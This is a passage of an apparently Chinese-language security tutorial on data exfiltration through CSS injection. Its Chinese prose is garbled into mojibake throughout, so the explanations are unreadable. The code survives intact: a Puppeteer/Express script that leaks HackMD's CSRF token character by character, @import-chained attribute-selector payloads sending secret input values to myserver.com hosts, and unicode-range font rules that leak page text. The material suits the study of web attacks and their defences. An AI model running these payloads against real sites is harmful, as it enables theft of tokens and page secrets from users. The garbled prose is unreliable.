ç‰¹åˆ¥è¨­ç½®ï¼Œæ‰æœƒè®“ metaã€Œèƒ½è¢«çœ‹åˆ°ã€ï¼š\n1 2 3 4 5 6 7 head, meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } ç…§ä¸Šé¢é€™æ¨£å¯«ï¼Œå°±æœƒçœ‹åˆ°ç€è¦½å™¨ç™¼å‡º requestã€‚ä¸éï¼Œç•«é¢ä¸Šå€’æ˜¯æ²’æœ‰é¡¯ç¤ºä»»ä½•æ±è¥¿ï¼Œå› ç‚ºç•¢ç«Ÿ content æ˜¯ä¸€å€‹å±¬æ€§ï¼Œè€Œä¸æ˜¯ HTML çš„ text nodeï¼Œæ‰€ä»¥ä¸æœƒé¡¯ç¤ºåœ¨ç•«é¢ä¸Šï¼Œä½†æ˜¯ meta é€™å€‹å…ƒç´ æœ¬èº«å…¶å¯¦æ˜¯çœ‹å¾—åˆ°çš„ï¼Œé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ request æœƒç™¼å‡ºå»ï¼š\nå¦‚æœä½ çœŸçš„æƒ³è¦åœ¨ç•«é¢ä¸Šé¡¯ç¤º content çš„è©±ï¼Œå…¶å¯¦ä¹Ÿåšå¾—åˆ°ï¼Œå¯ä»¥åˆ©ç”¨å½å…ƒç´ æ­é… attrï¼š\n1 2 3 meta:before { content: attr(content); } å°±æœƒçœ‹åˆ° meta è£¡é¢çš„å…§å®¹é¡¯ç¤ºåœ¨ç•«é¢ä¸Šäº†ã€‚\næœ€å¾Œï¼Œè®“æˆ‘å€‘ä¾†çœ‹ä¸€å€‹å¯¦éš›æ¡ˆä¾‹ã€‚\nå· HackMD çš„è³‡æ–™ HackMD çš„ CSRF token æ”¾åœ¨å…©å€‹åœ°æ–¹ï¼Œä¸€å€‹æ˜¯ hidden inputï¼Œå¦ä¸€å€‹æ˜¯ metaï¼Œå…§å®¹å¦‚ä¸‹ï¼š\n1 \u0026lt;meta name=\u0026#34;csrf-token\u0026#34; content=\u0026#34;h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI\u0026#34;\u0026gt; è€Œ HackMD å…¶å¯¦æ”¯æ´ \u0026lt;style\u0026gt; çš„ä½¿ç”¨ï¼Œé€™å€‹æ¨™ç±¤ä¸æœƒè¢«éæ¿¾æ‰ï¼Œæ‰€ä»¥ä½ æ˜¯å¯ä»¥å¯«ä»»ä½•çš„ style çš„ï¼Œè€Œç›¸é—œçš„ CSP å¦‚ä¸‹ï¼š\n1 2 3 img-src * data:; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com; font-src \u0026#39;self\u0026#39; data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com https://script.hotjar.com; å¯ä»¥çœ‹åˆ° unsafe-inline æ˜¯å…è¨±çš„ï¼Œæ‰€ä»¥å¯ä»¥æ’å…¥ä»»ä½•çš„ CSSã€‚\nç¢ºèªå¯ä»¥æ’å…¥ CSS ä»¥å¾Œï¼Œå°±å¯ä»¥é–‹å§‹ä¾†æº–å‚™å·è³‡æ–™äº†ã€‚é‚„è¨˜å¾—å‰é¢æœ‰ä¸€å€‹å•é¡Œæ²’æœ‰å›ç­”ï¼Œé‚£å°±æ˜¯ã€Œè©²æ€éº¼å·ç¬¬ä¸€å€‹ä»¥å¾Œçš„å­—å…ƒï¼Ÿã€ï¼Œæˆ‘å…ˆä»¥ HackMD ç‚ºä¾‹å›ç­”ã€‚\né¦–å…ˆï¼ŒCSRF token é€™ç¨®æ±è¥¿é€šå¸¸é‡æ–°æ•´ç†å°±æœƒæ›ä¸€å€‹ï¼Œæ‰€ä»¥ä¸èƒ½é‡æ–°æ•´ç†ï¼Œè€Œ HackMD å‰›å¥½æ”¯æ´å³æ™‚æ›´æ–°ï¼Œåªè¦å…§å®¹è®Šäº†ï¼Œæœƒç«‹åˆ»åæ˜ åœ¨å…¶ä»– client çš„ç•«é¢ä¸Šï¼Œå› æ­¤å¯ä»¥åšåˆ°ã€Œä¸é‡æ–°æ•´ç†è€Œæ›´æ–° styleã€ï¼Œæµç¨‹æ˜¯é€™æ¨£çš„ï¼š\næº–å‚™å¥½å·ç¬¬ä¸€å€‹å­—å…ƒçš„ styleï¼Œæ’å…¥åˆ° HackMD è£¡é¢ å—å®³è€…æ‰“é–‹é é¢ ä¼ºæœå™¨æ”¶åˆ°ç¬¬ä¸€å€‹å­—å…ƒçš„ request å¾ä¼ºæœå™¨æ›´æ–° HackMD å…§å®¹ï¼Œæ›æˆå·ç¬¬äºŒå€‹å­—å…ƒçš„ payload å—å®³è€…é é¢å³æ™‚æ›´æ–°ï¼Œè¼‰å…¥æ–°çš„ style ä¼ºæœå™¨æ”¶åˆ°ç¬¬äºŒå€‹å­—å…ƒçš„ request ä¸æ–·å¾ªç’°ç›´åˆ°å·å®Œæ‰€æœ‰å­—å…ƒ ç°¡å–®çš„ç¤ºæ„åœ–å¦‚ä¸‹ï¼š\nç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const express = require(\u0026#39;express\u0026#39;) const sleep = ms =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); // Create a hackMD document and let anyone can view/edit const noteUrl = \u0026#39;https://hackmd.io/1awd-Hg82fekACbL_ode3aasf\u0026#39; const host = \u0026#39;http://localhost:3000\u0026#39; const baseUrl = host + \u0026#39;/extract?q=\u0026#39; const port = process.env.PORT || 3000 ;(async function() { const app = express() const browser = await puppeteer.launch({ headless: true }); const page = await browser.newPage(); await page.setViewport({ width: 1280, height: 800 }) await page.setRequestInterception(true); page.on(\u0026#39;request\u0026#39;, request =\u0026gt; { const url = request.url() // cancel request to self if (url.includes(baseUrl)) { request.abort() } else { request.continue() } }); app.listen(port, () =\u0026gt; { console.log(`Listening at http://localhost:${port}`) console.log(\u0026#39;Waiting for server to get ready...\u0026#39;) startExploit(app, page) }) })() async function startExploit(app, page) { let currentToken = \u0026#39;\u0026#39; await page.goto(noteUrl + \u0026#39;?edit\u0026#39;); // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele await page.addStyleTag({ content: \u0026#34;{scroll-behavior: auto !important;}\u0026#34; }); const initialPayload = generateCss() await updateCssPayload(page, initialPayload) console.log(`Server is ready, you can open ${noteUrl}?view on the browser`) app.get(\u0026#39;/extract\u0026#39;, (req, res) =\u0026gt; { const query = req.query.q if (!query) return res.end() console.log(`query: ${query}, progress: ${query.length}/36`) currentToken = query if (query.length === 36) { console.log(\u0026#39;over\u0026#39;) return } const payload = generateCss(currentToken) updateCssPayload(page, payload) res.end() }) } async function updateCssPayload(page, payload) { await sleep(300) await page.click(\u0026#39;.CodeMirror-line\u0026#39;) await page.keyboard.down(\u0026#39;Meta\u0026#39;); await page.keyboard.press(\u0026#39;A\u0026#39;); await page.keyboard.up(\u0026#39;Meta\u0026#39;); await page.keyboard.press(\u0026#39;Backspace\u0026#39;); await sleep(300) await page.keyboard.sendCharacter(payload) console.log(\u0026#39;Updated css payload, waiting for next request\u0026#39;) } function generateCss(prefix = \u0026#34;\u0026#34;) { const csrfTokenChars = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\u0026#39;.split(\u0026#39;\u0026#39;) return ` ${prefix} \u0026lt;style\u0026gt; head, meta { display: block; } ${ csrfTokenChars.map(char =\u0026gt; ` meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;${prefix + char}\u0026#34;] { background: url(${baseUrl}${prefix + char}) } `).join(\u0026#39;\\n\u0026#39;) } \u0026lt;/style\u0026gt; ` } å¯ä»¥ç›´æ¥ç”¨ Node.js è·‘èµ·ä¾†ï¼Œè·‘èµ·ä¾†ä»¥å¾Œåœ¨ç€è¦½å™¨æ‰“é–‹ç›¸å°æ‡‰çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥åœ¨ terminal çœ‹åˆ° leak çš„é€²åº¦ã€‚\nä¸éå‘¢ï¼Œå°±ç®—å·åˆ°äº† HackMD çš„ CSRF tokenï¼Œä¾ç„¶é‚„æ˜¯æ²’è¾¦æ³• CSRFï¼Œå› ç‚º HackMD æœ‰åœ¨ server æª¢æŸ¥å…¶ä»–çš„ HTTP request header å¦‚ origin æˆ–æ˜¯ referer ç­‰ç­‰ï¼Œç¢ºä¿ request ä¾†è‡ªåˆæ³•çš„åœ°æ–¹ã€‚\nç¸½çµ åœ¨é€™ç¯‡è£¡é¢ï¼Œæˆ‘å€‘çœ‹åˆ°äº†ä¹‹æ‰€ä»¥å¯ä»¥ç”¨ CSS ä¾†å·è³‡æ–™çš„åŸç†ï¼Œèªªç©¿äº†å°±æ˜¯åˆ©ç”¨ã€Œå±¬æ€§é¸æ“‡å™¨ã€å†åŠ ä¸Šã€Œè¼‰å…¥åœ–ç‰‡ã€é€™å…©å€‹ç°¡å–®çš„åŠŸèƒ½ï¼Œä¹Ÿç¤ºç¯„äº†å¦‚ä½•å·å– hidden input è·Ÿ meta è£¡çš„è³‡æ–™ï¼Œä¸¦ä¸”ä»¥ HackMDç•¶ä½œå¯¦éš›æ¡ˆä¾‹èªªæ˜ã€‚\nä½†æ˜¯å‘¢ï¼Œæœ‰å¹¾å€‹å•é¡Œæˆ‘å€‘é‚„æ²’è§£æ±ºï¼Œåƒæ˜¯ï¼š\nHackMD å› ç‚ºå¯ä»¥å³æ™‚åŒæ­¥å…§å®¹ï¼Œæ‰€ä»¥ä¸éœ€è¦é‡æ–°æ•´ç†å°±å¯ä»¥è¼‰å…¥æ–°çš„ styleï¼Œé‚£å…¶ä»–ç¶²ç«™å‘¢ï¼Ÿè©²æ€éº¼å·åˆ°ç¬¬äºŒå€‹ä»¥å¾Œçš„å­—å…ƒï¼Ÿ ä¸€æ¬¡åªèƒ½å·ä¸€å€‹å­—å…ƒçš„è©±ï¼Œæ˜¯ä¸æ˜¯è¦å·å¾ˆä¹…å‘¢ï¼Ÿé€™åœ¨å¯¦éš›ä¸Šå¯è¡Œå—ï¼Ÿ æœ‰æ²’æœ‰è¾¦æ³•å·åˆ°å±¬æ€§ä»¥å¤–çš„æ±è¥¿ï¼Ÿä¾‹å¦‚èªªé é¢ä¸Šçš„æ–‡å­—å…§å®¹ï¼Œæˆ–ç”šè‡³æ˜¯ JavaScript çš„ç¨‹å¼ç¢¼ï¼Ÿ é‡å°é€™å€‹æ”»æ“Šæ‰‹æ³•çš„é˜²ç¦¦æ–¹å¼æœ‰å“ªäº›ï¼Ÿ ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injectionï¼ˆä¸‹ï¼‰ å·åˆ°æ‰€æœ‰å­—å…ƒ æˆ‘å€‘æƒ³å·çš„è³‡æ–™æœ‰å¯èƒ½åªè¦é‡æ–°æ•´ç†ä»¥å¾Œå°±æœƒæ”¹è®Šï¼ˆå¦‚ CSRF tokenï¼‰ï¼Œæ‰€ä»¥æˆ‘å€‘å¿…é ˆåœ¨ä¸é‡æ–°æ•´ç†çš„ç‹€æ³ä¹‹ä¸‹è¼‰å…¥æ–°çš„ styleã€‚\nå‰é¢ä¹‹æ‰€ä»¥åšå¾—åˆ°ï¼Œæ˜¯å› ç‚º HackMD æœ¬èº«å°±æ˜¯ä¸€å€‹æ¨™æ¦œå³æ™‚æ›´æ–°çš„æ–‡ä»¶ï¼Œä½†å¦‚æœæ˜¯ä¸€èˆ¬çš„ç¶²é å‘¢ï¼Ÿåœ¨ä¸èƒ½ç”¨ JavaScript çš„æƒ…æ³ä¸‹ï¼Œè©²å¦‚ä½•ä¸æ–·å‹•æ…‹è¼‰å…¥æ–°çš„ styleï¼Ÿ\næœ‰é—œæ–¼é€™å€‹å•é¡Œï¼Œåœ¨ CSS Injection Attacks é€™ä»½ç°¡å ±è£¡é¢çµ¦å‡ºäº†è§£ç­”ï¼š@importã€‚\nåœ¨ CSS è£¡é¢ï¼Œä½ å¯ä»¥ç”¨ @import å»æŠŠå¤–éƒ¨çš„å…¶ä»– style å¼•å…¥é€²ä¾†ï¼Œå°±åƒ JavaScript çš„ import é‚£æ¨£ã€‚\næˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™å€‹åŠŸèƒ½åšå‡ºå¼•å…¥ style çš„è¿´åœˆï¼Œå¦‚ä¸‹é¢çš„ç¨‹å¼ç¢¼ï¼š\n1 @import url(https://myserver.com/start?len=8) æ¥è‘—ï¼Œåœ¨ server å›å‚³å¦‚ä¸‹çš„ styleï¼š\n1 2 3 4 5 6 7 8 @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) é‡é»ä¾†äº†ï¼Œé€™é‚Šé›–ç„¶ä¸€æ¬¡å¼•å…¥äº† 8 å€‹ï¼Œä½†æ˜¯ã€Œå¾Œé¢ 7 å€‹ requestï¼Œserver éƒ½æœƒå…ˆ hang ä½ï¼Œä¸æœƒçµ¦ responseã€ï¼Œåªæœ‰ç¬¬ä¸€å€‹ç¶²å€ https://myserver.com/payload?len=1 æœƒå›å‚³ responseï¼Œå…§å®¹ç‚ºä¹‹å‰æéçš„å·è³‡æ–™ payloadï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;c\u0026#34;] { background: url(https://b.myserver.com/leak?q=c) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;z\u0026#34;] { background: url(https://b.myserver.com/leak?q=z) } ç•¶ç€è¦½å™¨æ”¶åˆ° response çš„æ™‚å€™ï¼Œå°±æœƒå…ˆè¼‰å…¥ä¸Šé¢é€™ä¸€æ®µ CSSï¼Œè¼‰å…¥å®Œä»¥å¾Œç¬¦åˆæ¢ä»¶çš„å…ƒç´ å°±æœƒç™¼ request åˆ°å¾Œç«¯ï¼Œå‡è¨­ç¬¬ä¸€å€‹å­—æ˜¯ d å¥½äº†ï¼Œæ¥è‘— server é€™æ™‚å€™æ‰å›å‚³ https://myserver.com/payload?len=2 çš„ responseï¼Œå…§å®¹ç‚ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;da\u0026#34;] { background: url(https://b.myserver.com/leak?q=da) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;db\u0026#34;] { background: url(https://b.myserver.com/leak?q=db) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;dc\u0026#34;] { background: url(https://b.myserver.com/leak?q=dc) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;dz\u0026#34;] { background: url(https://b.myserver.com/leak?q=dz) } ä»¥æ­¤é¡æ¨ï¼Œåªè¦ä¸æ–·é‡è¤‡é€™äº›æ­¥é©Ÿï¼Œå°±å¯ä»¥æŠŠæ‰€æœ‰å­—å…ƒéƒ½å‚³åˆ° server å»ï¼Œé çš„å°±æ˜¯ import æœƒå…ˆè¼‰å…¥å·²ç¶“ä¸‹è¼‰å¥½çš„ resourceï¼Œç„¶å¾Œå»ç­‰å¾…é‚„æ²’ä¸‹è¼‰å¥½çš„ç‰¹æ€§ã€‚\né€™é‚Šæœ‰ä¸€é»è¦ç‰¹åˆ¥æ³¨æ„ï¼Œä½ æœƒç™¼ç¾æˆ‘å€‘è¼‰å…¥ style çš„ domain æ˜¯ myserver.comï¼Œè€ŒèƒŒæ™¯åœ–ç‰‡çš„ domain æ˜¯ b.myserver.comï¼Œé€™æ˜¯å› ç‚ºç€è¦½å™¨é€šå¸¸å°æ–¼ä¸€å€‹ domain èƒ½åŒæ™‚è¼‰å…¥çš„ request æœ‰æ•¸é‡ä¸Šçš„é™åˆ¶ï¼Œæ‰€ä»¥å¦‚æœä½ å…¨éƒ¨éƒ½æ˜¯ç”¨ myserver.com çš„è©±ï¼Œæœƒç™¼ç¾èƒŒæ™¯åœ–ç‰‡çš„ request é€ä¸å‡ºå»ï¼Œéƒ½è¢« CSS import çµ¦å¡ä½äº†ã€‚\nå› æ­¤éœ€è¦è¨­ç½®å…©å€‹ domainï¼Œä¾†é¿å…é€™ç¨®ç‹€æ³ã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œä¸Šé¢é€™ç¨®æ–¹å¼åœ¨ Firefox æ˜¯è¡Œä¸é€šçš„ï¼Œå› ç‚ºåœ¨ Firefox ä¸Šå°±ç®—ç¬¬ä¸€å€‹çš„ response å…ˆå›ä¾†ï¼Œä¹Ÿä¸æœƒç«‹åˆ»æ›´æ–° styleï¼Œè¦ç­‰æ‰€æœ‰ request éƒ½å›ä¾†æ‰æœƒä¸€èµ·æ›´æ–°ã€‚è§£æ³•çš„è©±å¯ä»¥åƒè€ƒé€™ä¸€ç¯‡ï¼šCSS data exfiltration in Firefox via a single injection pointï¼ŒæŠŠç¬¬ä¸€æ­¥çš„ import æ‹¿æ‰ï¼Œç„¶å¾Œæ¯ä¸€å€‹å­—å…ƒçš„ import éƒ½ç”¨é¡å¤–çš„ style åŒ…è‘—ï¼Œåƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=1)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=2)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=3)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=4)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=5)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=6)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=7)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=8)\u0026lt;/style\u0026gt; è€Œä¸Šé¢é€™æ¨£ Chrome ä¹Ÿæ˜¯æ²’å•é¡Œçš„ï¼Œæ‰€ä»¥çµ±ä¸€æ”¹æˆä¸Šé¢é€™æ¨£ï¼Œå°±å¯ä»¥åŒæ™‚æ”¯æ´å…©ç¨®ç€è¦½å™¨äº†ã€‚\nç¸½çµä¸€ä¸‹ï¼Œåªè¦ç”¨ @import é€™å€‹ CSS çš„åŠŸèƒ½ï¼Œå°±å¯ä»¥åšåˆ°ã€Œä¸é‡æ–°è¼‰å…¥é é¢ï¼Œä½†å¯ä»¥å‹•æ…‹è¼‰å…¥æ–°çš„ styleã€ï¼Œé€²è€Œå·å–å¾Œé¢çš„æ¯ä¸€å€‹å­—å…ƒã€‚\nä¸€æ¬¡å·ä¸€å€‹å­—å…ƒï¼Œå¤ªæ…¢äº†å§ï¼Ÿ è‹¥æ˜¯æƒ³è¦åœ¨ç¾å¯¦ä¸–ç•Œä¸­åŸ·è¡Œé€™ç¨®æ”»æ“Šï¼Œæ•ˆç‡å¯èƒ½è¦å†æ›´å¥½ä¸€é»ã€‚ä»¥ HackMD ç‚ºä¾‹ï¼ŒCSRF token ç¸½å…±æœ‰ 36 å€‹å­—ï¼Œæ‰€ä»¥å°±è¦ç™¼ 36 å€‹ requestï¼Œç¢ºå¯¦æ˜¯å¤ªå¤šäº†é»ã€‚\näº‹å¯¦ä¸Šï¼Œæˆ‘å€‘ä¸€æ¬¡å¯ä»¥å·å…©å€‹å­—å…ƒï¼Œå› ç‚ºä¸Šé›†æœ‰è¬›éé™¤äº† prefix selector ä»¥å¤–ï¼Œä¹Ÿæœ‰ suffix selectorï¼Œæ‰€ä»¥å¯ä»¥åƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } // ... input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;a\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=a) } input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;b\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=b) } é™¤äº†å·é–‹é ­ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿå·çµå°¾ï¼Œæ•ˆç‡ç«‹åˆ»è®Šæˆå…©å€ã€‚è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯é–‹é ­è·Ÿçµå°¾çš„ CSSï¼Œä¸€å€‹ç”¨çš„æ˜¯ backgroundï¼Œå¦ä¸€å€‹ç”¨çš„æ˜¯ border-backgroundï¼Œæ˜¯ä¸åŒçš„å±¬æ€§ï¼Œå› ç‚ºå¦‚æœç”¨åŒä¸€å€‹å±¬æ€§çš„è©±ï¼Œå…§å®¹å°±æœƒè¢«å…¶ä»–çš„è“‹æ‰ï¼Œæœ€å¾Œåªæœƒç™¼å‡ºä¸€å€‹ requestã€‚\nè‹¥æ˜¯å…§å®¹å¯èƒ½å‡ºç¾çš„å­—å…ƒä¸å¤šï¼Œä¾‹å¦‚èªª 16 å€‹çš„è©±ï¼Œé‚£æˆ‘å€‘å¯ä»¥ç›´æ¥ä¸€æ¬¡å·å…©å€‹é–‹é ­åŠ ä¸Šå…©å€‹çµå°¾ï¼Œç¸½å…±çš„ CSS rule æ•¸é‡ç‚º 16*16*2 = 512 å€‹ï¼Œæ‡‰è©²é‚„åœ¨å¯ä»¥æ¥å—çš„ç¯„åœå…§ï¼Œå°±èƒ½å¤ å†åŠ é€Ÿå…©å€ã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥æœ server é‚£é‚Šå»æ”¹å–„ï¼Œä¾‹å¦‚èªªæ”¹ç”¨ HTTP/2 æˆ–ç”šè‡³æ˜¯ HTTP/3ï¼Œéƒ½æœ‰æ©Ÿæœƒèƒ½å¤ åŠ é€Ÿ request è¼‰å…¥çš„é€Ÿåº¦ï¼Œé€²è€Œæå‡æ•ˆç‡ã€‚\nå·å…¶ä»–æ±è¥¿ é™¤äº†å·å±¬æ€§ä¹‹å¤–ï¼Œæœ‰æ²’æœ‰è¾¦æ³•å·åˆ°å…¶ä»–æ±è¥¿ï¼Ÿä¾‹å¦‚èªªï¼Œé é¢ä¸Šçš„å…¶ä»–æ–‡å­—ï¼Ÿæˆ–ç”šè‡³æ˜¯ script è£¡é¢çš„ç¨‹å¼ç¢¼ï¼Ÿ\næ ¹æ“šæˆ‘å€‘åœ¨ä¸Šä¸€ç¯‡è£¡é¢è¬›çš„åŸç†ï¼Œæ˜¯åšä¸åˆ°çš„ã€‚å› ç‚ºèƒ½å·åˆ°å±¬æ€§æ˜¯å› ç‚ºã€Œå±¬æ€§é¸æ“‡å™¨ã€é€™å€‹æ±è¥¿ï¼Œæ‰è®“æˆ‘å€‘é¸åˆ°ç‰¹å®šçš„å…ƒç´ ï¼Œè€Œåœ¨ CSS è£¡é¢ï¼Œä¸¦æ²’æœ‰å¯ä»¥é¸æ“‡ã€Œå…§æ–‡ã€çš„é¸æ“‡å™¨ã€‚\nå› æ­¤ï¼Œæˆ‘å€‘éœ€è¦å° CSS ä»¥åŠç¶²é ä¸Šçš„æ¨£å¼æœ‰æ›´æ·±å…¥çš„ç†è§£ï¼Œæ‰æœ‰è¾¦æ³•é”æˆé€™ä»¶çœ‹ä¼¼ä¸å¯èƒ½çš„ä»»å‹™ã€‚\nunicode-range åœ¨ CSS è£¡é¢ï¼Œæœ‰ä¸€å€‹å±¬æ€§å«åšã€Œunicode-rangeã€ï¼Œå¯ä»¥é‡å°ä¸åŒçš„å­—å…ƒï¼Œè¼‰å…¥ä¸åŒçš„å­—é«”ã€‚åƒæ˜¯åº•ä¸‹é€™å€‹å¾ MDN æ‹¿ä¾†çš„ç¯„ä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;Ampersand\u0026#34;; src: local(\u0026#34;Times New Roman\u0026#34;); unicode-range: U+26; } div { font-size: 4em; font-family: Ampersand, Helvetica, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;Me \u0026amp; You = Us\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026amp; çš„ unicode æ˜¯ U+0026ï¼Œå› æ­¤åªæœ‰ \u0026amp; é€™å€‹å­—æœƒç”¨ä¸åŒçš„å­—é«”ä¾†é¡¯ç¤ºï¼Œå…¶ä»–éƒ½ç”¨åŒä¸€å€‹å­—é«”ã€‚\né€™æ‹›å‰ç«¯å·¥ç¨‹å¸«å¯èƒ½æœ‰ç”¨éï¼Œä¾‹å¦‚èªªè‹±æ–‡è·Ÿä¸­æ–‡å¦‚æœè¦ç”¨ä¸åŒå­—é«”ä¾†é¡¯ç¤ºï¼Œå°±å¾ˆé©åˆç”¨é€™ä¸€æ‹›ã€‚è€Œé€™æ‹›ä¹Ÿå¯ä»¥ç”¨ä¾†å·å–é é¢ä¸Šçš„æ–‡å­—ï¼Œåƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;f1\u0026#34;; src: url(https://myserver.com?q=1); unicode-range: U+31; } @font-face { font-family: \u0026#34;f2\u0026#34;; src: url(https://myserver.com?q=2); unicode-range: U+32; } @font-face { font-family: \u0026#34;f3\u0026#34;; src: url(https://myserver.com?q=3); unicode-range: U+33; } @font-face { font-family: \u0026#34;fa\u0026#34;; src: url(https://myserver.com?q=a); unicode-range: U+61; } @font-face { font-family: \u0026#34;fb\u0026#34;; src: url(https://myserver.com?q=b); unicode-range: U+62; } @font-face { font-family: \u0026#34;fc\u0026#34;; src: url(https://myserver.com?q=c); unicode-range: U+63; } div { font-size: 4em; font-family: f1, f2, f3, fa, fb, fc; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;ca31a\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¦‚æœä½ å»çœ‹ network tabï¼Œæœƒçœ‹åˆ°ä¸€å…±ç™¼é€äº† 4 å€‹ requestï¼š\nè—‰ç”±é€™æ‹›ï¼Œæˆ‘å€‘å¯ä»¥å¾—çŸ¥é é¢ä¸Šæœ‰ï¼š13ac é€™å››å€‹å­—å…ƒã€‚\nè€Œé€™æ‹›çš„ä¾·é™ä¹‹è™•ä¹Ÿå¾ˆæ˜é¡¯ï¼Œå°±æ˜¯ï¼š\næˆ‘å€‘ä¸çŸ¥é“å­—å…ƒçš„é †åºç‚ºä½• é‡è¤‡çš„å­—å…ƒä¹Ÿä¸æœƒçŸ¥é“ ä½†æ˜¯å¾ã€Œè¼‰å…¥å­—å‹ã€çš„è§’åº¦ä¸‹å»æ€è€ƒæ€éº¼å·åˆ°å­—å…ƒï¼Œè‘—å¯¦å¸¶çµ¦äº†è¨±å¤šäººä¸€å€‹æ–°çš„æ€è€ƒæ–¹å¼ï¼Œä¸¦ç™¼å±•å‡ºå„å¼å„æ¨£å…¶ä»–çš„æ–¹æ³•ã€‚\nå­—é«”é«˜åº¦å·®ç•° + first-line + scrollbar é€™æ‹›è¦è§£æ±ºçš„ä¸»è¦æ˜¯ä¸Šä¸€æ‹›ç¢°åˆ°çš„å•é¡Œï¼šã€Œæ²’è¾¦æ³•çŸ¥é“å­—å…ƒé †åºã€ï¼Œç„¶å¾Œé€™æ‹›çµåˆäº†å¾ˆå¤šç´°ç¯€ï¼Œæ­¥é©Ÿå¾ˆå¤šï¼Œè¦ä»”ç´°è½äº†ã€‚\né¦–å…ˆï¼Œæˆ‘å€‘å…¶å¯¦å¯ä»¥ä¸è¼‰å…¥å¤–éƒ¨å­—é«”ï¼Œç”¨å…§å»ºçš„å­—é«”å°±èƒ½ leak å‡ºå­—å…ƒã€‚é€™è¦æ€éº¼åšåˆ°å‘¢ï¼Ÿæˆ‘å€‘è¦å…ˆæ‰¾å‡ºå…©çµ„å…§å»ºå­—é«”ï¼Œé«˜åº¦æœƒä¸åŒã€‚\nä¾‹å¦‚æœ‰ä¸€å€‹å«åšã€ŒComic Sans 